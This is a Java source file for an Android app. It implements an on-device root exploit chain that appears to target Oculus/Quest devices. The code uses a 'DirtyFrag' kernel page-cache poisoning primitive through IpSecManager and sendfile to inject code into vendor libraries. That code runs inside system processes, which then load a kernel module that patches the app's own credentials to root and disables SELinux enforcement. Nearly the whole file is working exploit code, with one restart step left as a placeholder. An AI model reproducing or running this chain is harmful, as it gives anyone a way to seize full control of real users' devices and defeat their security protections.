package com.research.fuguapp;

import android.content.Context;
import android.content.Intent;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecManager.SecurityParameterIndex;
import android.net.IpSecManager.UdpEncapsulationSocket;
import android.net.IpSecTransform;
import android.system.Int64Ref;
import android.system.Os;
import android.system.OsConstants;
import android.util.Log;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * No-adb, on-device DirtyFrag driver (untrusted_app). Option #2 (see ../DESIGN.md). Runs the same
 * kernel primitive as the primary chain, using two confused-deputy system processes for the two
 * capabilities untrusted_app lacks:
 *   - carrier/cfg page-cache poison  -> ctor A injected into libcdsprpc, run inside trackingservice
 *   - setprop ctl.start insmod_sh    -> ctor B injected into libgralloc.qti, run inside com.oculus.assistant
 *
 * Builds are delegated to the bundled `fuguquest` (emit-* subcommands, exec'd from nativeLibraryDir).
 * SA staging + page-cache poison use the public IpSecManager API + Os.sendfile (proven from
 * untrusted_app). This class holds the SA alive for the whole run.
 */
public class Chain {
    static final String TAG = "FUGUAPP";
    static final int MSG_MORE = 0x8000;
    static byte[] KEYMAT = new byte[20];
    static Object[] KEEP;              // pin IpSec objects against GC teardown
    static Cipher AES;
    static File TRACE;

    static void trace(String s) {
        Log.i(TAG, s);
        try { FileWriter w = new FileWriter(TRACE, true); w.write(s + "\n"); w.close(); } catch (Throwable ignore) {}
    }
    static int ks0(byte[] iv) throws Exception {
        byte[] ctr = new byte[16];
        System.arraycopy(KEYMAT, 16, ctr, 0, 4);
        System.arraycopy(iv, 0, ctr, 4, 8);
        ctr[15] = 2;
        return AES.doFinal(ctr)[0] & 0xff;
    }

    // ---- entry ----
    public static String run(Context ctx) {
        try { return go(ctx); }
        catch (Throwable t) { trace("EXC " + t); StringBuilder sb = new StringBuilder("ERR " + t + "\n");
            for (StackTraceElement e : t.getStackTrace()) sb.append("  ").append(e).append("\n"); return sb.toString(); }
    }

    static String go(Context ctx) throws Exception {
        File dir = ctx.getFilesDir();
        TRACE = new File(dir, "trace"); try { new RandomAccessFile(TRACE, "rw").setLength(0); } catch (Throwable ignore) {}
        String nlib = ctx.getApplicationInfo().nativeLibraryDir;
        String fugu = nlib + "/libfugu.so";           // our orchestrator, exec'd only as a builder (emit-*)
        String dfp  = nlib + "/libdfpoison.so";        // native poison helper (optional; Java engine also works)
        trace("nativeLibraryDir=" + nlib);

        // 1) stage assets that must live in the (readable) data dir
        String tdir = dir.getAbsolutePath() + "/t";
        new File(tdir).mkdirs();
        extractAssets(ctx, "fugu", tdir);              // e2e.dex + targets/ (data files fuguquest reads)
        String dev = getprop("ro.build.version.incremental");
        File tj = pickTarget(new File(tdir, "targets"), dev);
        if (tj == null) return "no target for build " + dev;
        trace("target " + tj.getName());
        Json j = Json.parse(readTextFile(tj));
        StubBuilder.FUGU = fugu; StubBuilder.WORK = new File(tdir);

        // 2) keymat + AES for the SA keystream
        for (int i = 0; i < 20; i++) KEYMAT[i] = (byte) (0x41 + i);
        AES = Cipher.getInstance("AES/ECB/NoPadding");
        AES.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(Arrays.copyOfRange(KEYMAT, 0, 16), "AES"));

        // 3) stage the Dirty-Frag SA (public IpSecManager) — allowed for untrusted_app
        IpSecManager m = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
        InetAddress local = InetAddress.getByName("127.0.0.1");
        UdpEncapsulationSocket encap = m.openUdpEncapsulationSocket();
        int port = encap.getPort();
        SecurityParameterIndex spiObj = m.allocateSecurityParameterIndex(local);
        int spi = spiObj.getSpi();
        IpSecAlgorithm alg = new IpSecAlgorithm(IpSecAlgorithm.AUTH_CRYPT_AES_GCM, KEYMAT, 128);
        IpSecTransform tr = new IpSecTransform.Builder(ctx)
                .setAuthenticatedEncryption(alg).setIpv4Encapsulation(encap, port)
                .buildTransportModeTransform(local, spiObj);
        KEEP = new Object[]{ m, encap, spiObj, alg, tr };
        trace("SA up spi=0x" + Integer.toHexString(spi) + " port=" + port);

        // 4) BUILD carrier flip.ko + patched cfg + ctor-A inject stub (carrier+cfg poison) via bundled fuguquest.
        //    ctor A is the standard inject stub (SA-replay poison of carrier+cfg), run inside trackingservice.
        String tsub = tdir + "/targets/" + tj.getName().replace(".json", "");
        String carrierPath = j.s("carrier", "device_path");
        String carrierLocal = tsub + "/" + new File(j.s("carrier", "local_ko")).getName();
        String injLib = j.has("inject_lib") ? j.s("inject_lib", "device_path") : j.s("libeva", "device_path");
        String injKey = j.has("inject_lib") ? "inject_lib" : "libeva";
        String flip = tdir + "/flip.ko", cfgpat = tdir + "/cfg_patched.bin";
        String injSpec = tdir + "/inject.spec";
        // (build sequence mirrors ../rust run() / the primary chain's builders; args per fuguquest emit-*)
        exec(fugu, "emit-carrier", carrierLocal, flip, j.s("carrier", "anchor_reloc_off"),
             j.s("kernel", "delta_selinux_from_anchor"));
        exec(fugu, "emit-cfg", tsub + "/init.insmod.cfg", cfgpat, carrierPath,
             j.s("cfg", "inject_off"), j.s("cfg", "inject_len"));
        exec(fugu, "emit-stub", injSpec, tdir + "/inject.raw",
             j.s("dirtyfrag", "sa_spi"), j.s("dirtyfrag", "keymat_base"), Integer.toString(port),
             j.s(injKey, "orig_ctor_off"), j.s(injKey, "stub_gap_off"), j.s(injKey, "stub_gap_size"),
             j.s(injKey, "init_array_off"),
             carrierPath, carrierLocal, flip,
             "/vendor/etc/init.insmod.cfg", tsub + "/init.insmod.cfg", cfgpat);
        // NOTE: emit-stub CLI in fuguquest is: emit-stub <out_raw> <out_spec> <spi> <km> <port> <gap_off>
        //       <gap_size> <orig_ctor> <ia_off> (<path> <cur> <want>)...  -- adapt arg order at integration.

        // 5) BUILD the cred carrier for THIS app's pid (so the module cred-patches us -> we become root).
        int mypid = Os.getpid();
        String credko = tdir + "/cred.ko";
        boolean merged = "true".equals(j.sOr("kernel", "merged", "false"));
        String credSrc = merged ? carrierLocal : (tsub + "/" + new File(j.s("cred_carrier", "local_ko")).getName());
        exec(fugu, "emit-credmod", credSrc, credko,
             j.s("kernel", "delta_selinux_from_anchor"), j.s("kernel", "delta_findvpid_from_anchor"),
             j.s("kernel", "delta_pidtask_from_anchor"), Integer.toString(mypid),
             j.s("kernel", "delta_ssuse_from_anchor"), j.sOr("kernel", "enforcing_off", "0"),
             j.sOr("kernel", "cred_off", "0x778"), j.sOr("kernel", "cred_security_off", "0x78"));

        // 6) BUILD ctor B (assistant setprop stub) for libgralloc.qti's init-array gap.
        String glib = "/vendor/lib64/libgralloc.qti.so";
        StubBuilder.Ctor b = StubBuilder.assistantSetpropCtor(
                readFile(new File(glib)),                 // untrusted_app can read same_process_hal_file
                "/dev/socket/property_service", "ctl.start", "insmod_sh");
        // b.spec = page-cache poison spec (offset,val records) that plants ctor B + repoints init_array[0]

        // 7) POISON the two inject libs from THIS app (open O_RDONLY + sendfile via the SA).
        poison(injLib, readFile(new File(injSpec)), port, spi);      // ctor A -> trackingservice
        trace("poisoned inject-lib (ctor A) " + injLib);
        poison(glib, b.spec, port, spi);                            // ctor B -> assistant
        trace("poisoned libgralloc.qti (ctor B)");

        // 8) TRIGGER A: restart trackingservice so ctor A runs (poisons carrier+cfg).  [OPEN]
        boolean tsRestarted = restartTracking(ctx);
        trace("trackingservice restart attempted: " + tsRestarted);
        Thread.sleep(600);                                          // settle for ctor A

        // 9) push the cred carrier where init's insmod_sh can load it, and make the cfg point to it.
        //    (the primary chain's cfg already got the flip carrier line via ctor A; for the app path the
        //     cred carrier is loaded on the SAME insmod_sh pass — see DESIGN "Full flow".)
        copy(credko, "/data/local/tmp/cred.ko");                    // world-readable so init can load it

        // 10) TRIGGER B: cold-launch the assistant -> ctor B runs as assistant_app -> setprop ctl.start insmod_sh
        Intent i = new Intent();
        i.setClassName("com.oculus.assistant", "com.oculus.assistant.metaai.nux.MetaAINUXActivity");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try { ctx.startActivity(i); trace("launched assistant (ctor B trigger)"); }
        catch (Throwable t) { trace("assistant launch failed: " + t); }

        // 11) verify
        String res = "pending";
        for (int k = 0; k < 40; k++) {
            Thread.sleep(250);
            String ge = getprop("getenforce_"); // placeholder; use exec("getenforce") below
            int uid = Os.getuid();
            String enforce = runCmd("getenforce");
            if (uid == 0) { res = "ROOT uid=0 enforce=" + enforce; break; }
            if ("Permissive".equals(enforce)) res = "PERMISSIVE (module loaded) uid=" + uid;
        }
        // revert the noisy libgralloc.qti poison ASAP (collateral: it fires ctor B in any fresh graphics proc)
        try { poison(glib, b.revert, port, spi); trace("reverted libgralloc.qti"); } catch (Throwable ignore) {}
        try { tr.close(); encap.close(); spiObj.close(); } catch (Throwable ignore) {}
        trace("RESULT " + res);
        return res;
    }

    // ---- page-cache poison engine (proven from untrusted_app; from q1df/Writer) ----
    static void poison(String path, byte[] spec, int port, int spi) throws Exception {
        FileDescriptor sk = Os.socket(OsConstants.AF_INET, OsConstants.SOCK_DGRAM, 0);
        try { Os.setsockoptInt(sk, OsConstants.SOL_SOCKET, OsConstants.SO_SNDBUF, 4 << 20); } catch (Throwable t) {}
        Os.connect(sk, InetAddress.getByName("127.0.0.1"), port);
        FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0);
        RandomAccessFile r = new RandomAccessFile(path, "r");
        java.util.Random rnd = new java.util.Random(0x51C1L);
        int nrec = spec.length / 5, wrote = 0;
        for (int k = 0; k < nrec; k++) {
            long o = (spec[k*5] & 0xffL) | ((spec[k*5+1] & 0xffL)<<8) | ((spec[k*5+2] & 0xffL)<<16) | ((spec[k*5+3] & 0xffL)<<24);
            int want = spec[k*5+4] & 0xff;
            r.seek(o); int cur = r.read();
            if (cur == want) continue;
            int need = (cur ^ want) & 0xff;
            byte[] iv = new byte[8]; int n = 0;
            while (true) { rnd.nextBytes(iv); n++; if (ks0(iv) == need) break; if (n > 2000000) throw new RuntimeException("no IV @"+o); }
            byte[] hdr = new byte[16];
            hdr[0]=(byte)(spi>>>24); hdr[1]=(byte)(spi>>>16); hdr[2]=(byte)(spi>>>8); hdr[3]=(byte)spi;
            hdr[7]=1; System.arraycopy(iv,0,hdr,8,8);
            int tries = 0;
            while (true) {
                try { Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0); Os.sendfile(sk, f, new Int64Ref(o), 17);
                      Os.sendto(sk, new byte[0], 0, 0, 0, null, 0); break; }
                catch (android.system.ErrnoException e) { try { Os.sendto(sk, new byte[0], 0, 0, 0, null, 0); } catch (Throwable ig) {}
                      if (++tries > 500) throw e; Thread.sleep(2); }
            }
            wrote++; if ((wrote & 63) == 0) Thread.sleep(1);
        }
        r.close(); Os.close(f); Os.close(sk);
    }

    // ---- [OPEN] restart trackingservice from untrusted_app (no dumpsys) ----
    // Best-effort: bounce it so its poisoned libcdsprpc init_array (ctor A) runs on respawn. Candidates:
    // a crashing binder transaction to a reachable tracking service (handtracking_service /
    // tracking_proxy_service), or a legitimate reload. Not yet demonstrated — see DESIGN [OPEN] #1.
    static boolean restartTracking(Context ctx) {
        // Placeholder hook. Fill with the crash primitive once identified.
        return false;
    }

    // ---- helpers ----
    static String getprop(String p) { return runCmd("getprop", p); }
    static String runCmd(String... a) {
        try { Process pr = new ProcessBuilder(a).redirectErrorStream(true).start();
            byte[] b = readAll(pr.getInputStream()); pr.waitFor(); return new String(b).trim(); }
        catch (Throwable t) { return ""; }
    }
    static void exec(String... a) throws Exception {
        Process pr = new ProcessBuilder(a).redirectErrorStream(true).start();
        byte[] b = readAll(pr.getInputStream()); int rc = pr.waitFor();
        if (rc != 0) throw new RuntimeException("exec rc=" + rc + " " + a[0] + " " + a[1] + " :: " + new String(b));
    }
    static void copy(String src, String dst) throws Exception {
        byte[] b = readFile(new File(src)); RandomAccessFile r = new RandomAccessFile(dst, "rw"); r.setLength(0); r.write(b); r.close();
        try { Os.chmod(dst, 0644); } catch (Throwable ignore) {}
    }
    static byte[] readFile(File f) throws Exception { return java.nio.file.Files.readAllBytes(f.toPath()); }
    static byte[] readAll(InputStream in) throws Exception {
        java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream(); byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) o.write(buf, 0, n); return o.toByteArray();
    }
    static void extractAssets(Context ctx, String assetDir, String outDir) throws Exception {
        String[] names = ctx.getAssets().list(assetDir);
        for (String n : names) {
            String path = assetDir + "/" + n;
            String[] sub = ctx.getAssets().list(path);
            if (sub != null && sub.length > 0) { new File(outDir + "/" + n).mkdirs(); extractAssets(ctx, path, outDir + "/" + n); }
            else { InputStream in = ctx.getAssets().open(path); byte[] b = readAll(in); in.close();
                   RandomAccessFile r = new RandomAccessFile(outDir + "/" + n, "rw"); r.setLength(0); r.write(b); r.close(); }
        }
    }
    static File pickTarget(File dir, String build) throws Exception {
        File[] fs = dir.listFiles(); if (fs == null) return null;
        for (File f : fs) { if (!f.getName().endsWith(".json")) continue;
            if (readTextFile(f).contains("\"build_incremental\": \"" + build + "\"")) return f; }
        return null;
    }
    static String readTextFile(File f) throws Exception { return new String(readFile(f)); }
}
